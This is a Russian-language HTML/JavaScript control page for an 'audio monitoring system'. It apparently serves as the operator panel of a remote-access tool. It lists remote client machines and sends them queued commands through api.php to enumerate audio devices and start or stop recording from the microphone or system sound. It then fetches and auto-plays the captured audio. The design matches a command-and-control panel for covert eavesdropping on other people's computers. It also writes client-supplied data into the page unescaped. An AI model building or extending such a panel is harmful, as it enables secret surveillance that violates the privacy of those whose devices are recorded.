<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Аудио мониторинг</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1, h2 {
            color: #2c3e50;
        }
        .section {
            margin-bottom: 25px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        select, input, button {
            padding: 8px 12px;
            margin: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #3498db;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #2980b9;
        }
        button:disabled {
            background-color: #95a5a6;
            cursor: not-allowed;
        }
        .status {
            padding: 8px;
            margin: 5px 0;
            border-radius: 4px;
        }
        .online {
            background-color: #d4edda;
            color: #155724;
        }
        .offline {
            background-color: #f8d7da;
            color: #721c24;
        }
        .audio-controls {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
            margin-top: 15px;
        }
        .audio-device {
            margin: 5px 0;
            padding: 8px;
            background-color: #f8f9fa;
            border-radius: 4px;
            cursor: pointer;
        }
        .audio-device:hover {
            background-color: #e9ecef;
        }
        .audio-device.selected {
            background-color: #d1ecf1;
            border-left: 4px solid #17a2b8;
        }
        .audio-visualization {
            width: 100%;
            height: 60px;
            background-color: #f8f9fa;
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden;
        }
        #visualizer {
            width: 100%;
            height: 100%;
        }
        .client-list {
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 5px;
        }
        .client-item {
            padding: 8px;
            margin: 5px 0;
            background-color: #f8f9fa;
            border-radius: 4px;
            cursor: pointer;
        }
        .client-item:hover {
            background-color: #e9ecef;
        }
        .client-item.selected {
            background-color: #d1ecf1;
            border-left: 4px solid #17a2b8;
        }
        .log-container {
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px;
            background-color: #f8f9fa;
            font-family: monospace;
            font-size: 0.9em;
        }
        .log-entry {
            margin: 5px 0;
            padding: 5px;
            border-bottom: 1px solid #eee;
        }
        .log-time {
            color: #6c757d;
            margin-right: 10px;
        }
        .log-error {
            color: #dc3545;
        }
        .log-success {
            color: #28a745;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Система аудио мониторинга</h1>

        <div class="section">
            <h2>Подключенные клиенты</h2>
            <button id="refreshClients">Обновить список</button>
            <div class="client-list" id="clientList">
                <!-- Список клиентов будет здесь -->
            </div>
            <div id="clientStatus" class="status"></div>
        </div>

        <div class="section">
            <h2>Аудио устройства клиента</h2>
            <button id="getAudioDevices" disabled>Получить аудио устройства</button>
            <div id="audioDevices">
                <!-- Список аудио устройств будет здесь -->
            </div>
        </div>

        <div class="section">
            <h2>Управление записью</h2>
            <div class="audio-controls">
                <button id="startRecording" disabled>Начать запись</button>
                <button id="stopRecording" disabled>Остановить запись</button>
                <select id="deviceType">
                    <option value="microphone">Микрофон</option>
                    <option value="desktop">Системный звук</option>
                </select>
            </div>
            <div id="recordingStatus"></div>
        </div>

        <div class="section">
            <h2>Прослушивание</h2>
            <div class="audio-controls">
                <button id="startMonitoring" disabled>Начать прослушивание</button>
                <button id="stopMonitoring">Остановить прослушивание</button>
                <label>
                    <input type="checkbox" id="autoPlay" checked> Автовоспроизведение
                </label>
            </div>
            <div class="audio-visualization">
                <canvas id="visualizer"></canvas>
            </div>
            <div id="playbackStatus"></div>
        </div>

        <div class="section">
            <h2>Журнал событий</h2>
            <div class="log-container" id="eventLog">
                <!-- Журнал событий будет здесь -->
            </div>
        </div>
    </div>

    <script>
        // Глобальные переменные
        let selectedClientId = null;
        let selectedDeviceId = null;
        let selectedDeviceName = null;
        let isRecording = false;
        let isMonitoring = false;
        let audioContext = null;
        let audioElements = [];
        let monitoringInterval = null;
        let lastPlaybackTime = 0;
        let visualizationInterval = null;
        let analyzer = null;

        // Элементы DOM
        const clientList = document.getElementById('clientList');
        const clientStatus = document.getElementById('clientStatus');
        const audioDevices = document.getElementById('audioDevices');
        const getAudioDevicesBtn = document.getElementById('getAudioDevices');
        const startRecordingBtn = document.getElementById('startRecording');
        const stopRecordingBtn = document.getElementById('stopRecording');
        const deviceTypeSelect = document.getElementById('deviceType');
        const recordingStatus = document.getElementById('recordingStatus');
        const startMonitoringBtn = document.getElementById('startMonitoring');
        const stopMonitoringBtn = document.getElementById('stopMonitoring');
        const playbackStatus = document.getElementById('playbackStatus');
        const eventLog = document.getElementById('eventLog');
        const refreshClientsBtn = document.getElementById('refreshClients');
        const visualizer = document.getElementById('visualizer');
        const autoPlayCheckbox = document.getElementById('autoPlay');

        // Инициализация
        document.addEventListener('DOMContentLoaded', function() {
            refreshClients();
            setupEventListeners();
        });

        // Настройка обработчиков событий
        function setupEventListeners() {
            refreshClientsBtn.addEventListener('click', refreshClients);
            getAudioDevicesBtn.addEventListener('click', getAudioDevices);
            startRecordingBtn.addEventListener('click', startRecording);
            stopRecordingBtn.addEventListener('click', stopRecording);
            startMonitoringBtn.addEventListener('click', startMonitoring);
            stopMonitoringBtn.addEventListener('click', stopMonitoring);

            // Инициализация визуализатора
            const canvasCtx = visualizer.getContext('2d');
            visualizer.width = visualizer.offsetWidth;
            visualizer.height = visualizer.offsetHeight;
        }

        // Обновление списка клиентов
        function refreshClients() {
            addLog('Запрос списка клиентов...');

            // В вашем API нет endpoint'а для получения списка клиентов
            // Будем использовать данные из data.json
            fetch('api.php?action=get_clients_info')
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Ошибка получения данных');
                    }
                    return response.json();
                })
                .then(data => {
                    clientList.innerHTML = '';

                    if (!data.clients || Object.keys(data.clients).length === 0) {
                        clientList.innerHTML = '<div class="client-item">Нет подключенных клиентов</div>';
                        return;
                    }

                    Object.keys(data.clients).forEach(clientId => {
                        const client = data.clients[clientId];
                        const clientItem = document.createElement('div');
                        clientItem.className = 'client-item';
                        clientItem.dataset.id = clientId;

                        const statusClass = isClientOnline(client) ? 'online' : 'offline';
                        const statusText = isClientOnline(client) ? 'Online' : 'Offline';

                        clientItem.innerHTML = `
                            <strong>${clientId}</strong> - ${client.machine || 'Неизвестное устройство'}
                            <span class="status ${statusClass}">${statusText}</span>
                        `;

                        clientItem.addEventListener('click', () => selectClient(clientId, client));
                        clientList.appendChild(clientItem);
                    });

                    addLog(`Получено клиентов: ${Object.keys(data.clients).length}`);
                })
                .catch(error => {
                    addLog('Ошибка при получении списка клиентов: ' + error.message, 'error');
                    // Fallback: попробуем получить данные из data.json напрямую
                    fetch('data.json')
                        .then(response => response.json())
                        .then(data => {
                            displayClients(data.clients);
                        })
                        .catch(error => {
                            addLog('Не удалось загрузить данные клиентов', 'error');
                        });
                });
        }

        // Отображение клиентов из данных
        function displayClients(clients) {
            clientList.innerHTML = '';

            if (!clients || Object.keys(clients).length === 0) {
                clientList.innerHTML = '<div class="client-item">Нет подключенных клиентов</div>';
                return;
            }

            Object.keys(clients).forEach(clientId => {
                const client = clients[clientId];
                const clientItem = document.createElement('div');
                clientItem.className = 'client-item';
                clientItem.dataset.id = clientId;

                const statusClass = isClientOnline(client) ? 'online' : 'offline';
                const statusText = isClientOnline(client) ? 'Online' : 'Offline';

                clientItem.innerHTML = `
                    <strong>${clientId}</strong> - ${client.machine || 'Неизвестное устройство'}
                    <span class="status ${statusClass}">${statusText}</span>
                `;

                clientItem.addEventListener('click', () => selectClient(clientId, client));
                clientList.appendChild(clientItem);
            });

            addLog(`Получено клиентов: ${Object.keys(clients).length}`);
        }

        // Проверка активности клиента
        function isClientOnline(client) {
            if (!client.last_seen) return false;
            const now = Math.floor(Date.now() / 1000);
            return (now - client.last_seen) < 120; // Клиент онлайн, если был активен менее 2 минут назад
        }

        // Выбор клиента
        function selectClient(clientId, clientData) {
            selectedClientId = clientId;

            // Снимаем выделение со всех клиентов
            document.querySelectorAll('.client-item').forEach(item => {
                item.classList.remove('selected');
            });

            // Выделяем выбранного клиента
            const selectedItem = document.querySelector(`.client-item[data-id="${clientId}"]`);
            if (selectedItem) {
                selectedItem.classList.add('selected');
            }

            // Обновляем статус
            clientStatus.textContent = `Выбран клиент: ${clientId}`;
            clientStatus.className = 'status online';

            // Активируем кнопки
            getAudioDevicesBtn.disabled = false;
            startMonitoringBtn.disabled = false;

            addLog(`Выбран клиент: ${clientId}`);
        }

        // Получение аудио устройств клиента
        function getAudioDevices() {
            if (!selectedClientId) {
                addLog('Сначала выберите клиента', 'error');
                return;
            }

            addLog(`Запрос аудио устройств у клиента: ${selectedClientId}`);

            // Отправка команды клиенту
            fetch('api.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'action': 'set_command',
                    'client_id': selectedClientId,
                    'command': 'micinfo'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'ok') {
                    addLog('Команда отправлена клиенту. Ожидание ответа...');

                    // Запрос результата с задержкой
                    setTimeout(() => fetchAudioDevicesResult(), 2000);
                } else {
                    addLog('Ошибка при отправке команды', 'error');
                }
            })
            .catch(error => {
                addLog('Ошибка при отправке команды: ' + error.message, 'error');
            });
        }

        // Получение результата запроса аудио устройств
        function fetchAudioDevicesResult() {
            fetch('api.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'action': 'get_output',
                    'client_id': selectedClientId
                })
            })
            .then(response => response.json())
            .then(data => {
                try {
                    // Попробуем найти JSON в выводе
                    const jsonMatch = data.output.match(/{.*}/);
                    if (jsonMatch) {
                        const devices = JSON.parse(jsonMatch[0]);
                        displayAudioDevices(devices);
                        addLog(`Получено аудио устройств: ${devices.length}`);
                    } else {
                        addLog('Не удалось найти данные устройств в ответе', 'error');
                        addLog('Ответ сервера: ' + data.output);
                    }
                } catch (e) {
                    addLog('Ошибка при разборе данных устройств: ' + e.message, 'error');
                    addLog('Ответ сервера: ' + data.output);
                }
            })
            .catch(error => {
                addLog('Ошибка при получении устройств: ' + error.message, 'error');
            });
        }

        // Отображение списка аудио устройств
        function displayAudioDevices(devices) {
            audioDevices.innerHTML = '';

            if (devices.length === 0) {
                audioDevices.innerHTML = '<div>Аудио устройства не найдены</div>';
                return;
            }

            devices.forEach(device => {
                const deviceEl = document.createElement('div');
                deviceEl.className = 'audio-device';
                deviceEl.dataset.id = device.id;
                deviceEl.dataset.name = device.name;

                deviceEl.innerHTML = `
                    <strong>${device.name}</strong>
                    <div>Каналы: ${device.channels}, Частота: ${device.sample_rate} Hz</div>
                `;

                deviceEl.addEventListener('click', () => selectAudioDevice(device.id, device.name));
                audioDevices.appendChild(deviceEl);
            });
        }

        // Выбор аудио устройства
        function selectAudioDevice(deviceId, deviceName) {
            selectedDeviceId = deviceId;
            selectedDeviceName = deviceName;

            // Снимаем выделение со всех устройств
            document.querySelectorAll('.audio-device').forEach(item => {
                item.classList.remove('selected');
            });

            // Выделяем выбранное устройство
            const selectedItem = document.querySelector(`.audio-device[data-id="${deviceId}"]`);
            if (selectedItem) {
                selectedItem.classList.add('selected');
            }

            // Активируем кнопку записи
            startRecordingBtn.disabled = false;

            addLog(`Выбрано устройство: ${deviceName}`);
        }

        // Начало записи
        function startRecording() {
            if (!selectedClientId || !selectedDeviceName) {
                addLog('Сначала выберите клиента и устройство', 'error');
                return;
            }

            const deviceType = deviceTypeSelect.value;
            const deviceName = deviceType === 'desktop' ? 'desktop' : selectedDeviceName;

            addLog(`Запуск записи с устройства: ${deviceName}`);

            // Отправка команды клиенту
            fetch('api.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'action': 'set_command',
                    'client_id': selectedClientId,
                    'command': `micstart:${deviceName}`
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'ok') {
                    isRecording = true;
                    startRecordingBtn.disabled = true;
                    stopRecordingBtn.disabled = false;
                    recordingStatus.textContent = `Запись запущена: ${deviceName}`;
                    recordingStatus.className = 'status online';
                    addLog('Запись запущена');
                } else {
                    addLog('Ошибка при запуске записи', 'error');
                }
            })
            .catch(error => {
                addLog('Ошибка при запуске записи: ' + error.message, 'error');
            });
        }

        // Остановка записи
        function stopRecording() {
            if (!selectedClientId) {
                addLog('Сначала выберите клиента', 'error');
                return;
            }

            addLog('Остановка записи...');

            // Отправка команды клиенту
            fetch('api.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'action': 'set_command',
                    'client_id': selectedClientId,
                    'command': 'micstop'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'ok') {
                    isRecording = false;
                    startRecordingBtn.disabled = false;
                    stopRecordingBtn.disabled = true;
                    recordingStatus.textContent = 'Запись остановлена';
                    recordingStatus.className = 'status';
                    addLog('Запись остановлена');
                } else {
                    addLog('Ошибка при остановке записи', 'error');
                }
            })
            .catch(error => {
                addLog('Ошибка при остановке записи: ' + error.message, 'error');
            });
        }

        // Начало прослушивания
        function startMonitoring() {
            if (!selectedClientId) {
                addLog('Сначала выберите клиента', 'error');
                return;
            }

            isMonitoring = true;
            startMonitoringBtn.disabled = true;
            stopMonitoringBtn.disabled = false;
            lastPlaybackTime = Date.now() / 1000;

            addLog('Начало прослушивания...');
            playbackStatus.textContent = 'Прослушивание запущено';
            playbackStatus.className = 'status online';

            // Инициализация аудио контекста
            if (!audioContext) {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
            }

            // Запуск цикла прослушивания
            monitoringInterval = setInterval(fetchAndPlayAudio, 2000);

            // Запуск визуализации
            startVisualization();
        }

        // Остановка прослушивания
        function stopMonitoring() {
            isMonitoring = false;
            startMonitoringBtn.disabled = false;
            stopMonitoringBtn.disabled = true;

            addLog('Прослушивание остановлено');
            playbackStatus.textContent = 'Прослушивание остановлено';
            playbackStatus.className = 'status';

            // Остановка цикла прослушивания
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
                monitoringInterval = null;
            }

            // Остановка визуализации
            stopVisualization();

            // Остановка всех аудио элементов
            audioElements.forEach(audio => {
                audio.pause();
            });
            audioElements = [];
        }

        // Получение и воспроизведение аудио
        function fetchAndPlayAudio() {
            if (!isMonitoring) return;

            // Получаем список аудио файлов
            fetch('api.php', {
                method: 'POST',
                body: new URLSearchParams({
                    'action': 'get_audio_files',
                    'client_id': selectedClientId
                })
            })
            .then(response => response.json())
            .then(files => {
                // Фильтруем файлы, которые еще не проигрывались
                const newFiles = files.filter(file => file.timestamp > lastPlaybackTime);

                // Сортируем по времени
                newFiles.sort((a, b) => a.timestamp - b.timestamp);

                // Обновляем время последнего воспроизведения
                if (newFiles.length > 0) {
                    lastPlaybackTime = Math.max(lastPlaybackTime, ...newFiles.map(f => f.timestamp));
                }

                // Проигрываем каждый файл
                newFiles.forEach(file => {
                    if (autoPlayCheckbox.checked) {
                        const audio = new Audio(`api.php?action=get_audio_file&client_id=${selectedClientId}&filename=${encodeURIComponent(file.filename)}`);
                        audio.addEventListener('ended', function() {
                            // Удаляем элемент из массива после завершения воспроизведения
                            const index = audioElements.indexOf(audio);
                            if (index > -1) {
                                audioElements.splice(index, 1);
                            }
                        });

                        audio.play().catch(e => {
                            addLog('Ошибка воспроизведения: ' + e.message, 'error');
                        });

                        audioElements.push(audio);
                    }

                    addLog(`Воспроизведение аудио: ${new Date(file.timestamp * 1000).toLocaleTimeString()}`);
                });
            })
            .catch(error => {
                addLog('Ошибка при получении аудио файлов: ' + error.message, 'error');
            });
        }

        // Запуск визуализации аудио
        function startVisualization() {
            if (!audioContext) return;

            // Создаем анализатор
            analyzer = audioContext.createAnalyser();
            analyzer.fftSize = 256;

            const bufferLength = analyzer.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);

            const canvasCtx = visualizer.getContext('2d');
            const width = visualizer.width;
            const height = visualizer.height;

            // Очищаем canvas
            canvasCtx.clearRect(0, 0, width, height);

            // Функция отрисовки
            function draw() {
                if (!isMonitoring) return;

                requestAnimationFrame(draw);

                analyzer.getByteFrequencyData(dataArray);

                canvasCtx.fillStyle = 'rgb(240, 240, 240)';
                canvasCtx.fillRect(0, 0, width, height);

                const barWidth = (width / bufferLength) * 2.5;
                let barHeight;
                let x = 0;

                for (let i = 0; i < bufferLength; i++) {
                    barHeight = dataArray[i] / 2;

                    canvasCtx.fillStyle = 'rgb(' + (barHeight + 100) + ', 50, 50)';
                    canvasCtx.fillRect(x, height - barHeight, barWidth, barHeight);

                    x += barWidth + 1;
                }
            }

            // Подключаем анализатор к первому аудио элементу
            if (audioElements.length > 0) {
                const source = audioContext.createMediaElementSource(audioElements[0]);
                source.connect(analyzer);
                analyzer.connect(audioContext.destination);
            }

            draw();
        }

        // Остановка визуализации
        function stopVisualization() {
            const canvasCtx = visualizer.getContext('2d');
            canvasCtx.clearRect(0, 0, visualizer.width, visualizer.height);
        }

        // Добавление записи в журнал
        function addLog(message, type = 'info') {
            const now = new Date();
            const timeString = now.toLocaleTimeString();

            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${type}`;
            logEntry.innerHTML = `<span class="log-time">${timeString}</span> ${message}`;

            eventLog.appendChild(logEntry);
            eventLog.scrollTop = eventLog.scrollHeight;
        }

        // Периодическое обновление списка клиентов
        setInterval(refreshClients, 30000);
    </script>
</body>
</html>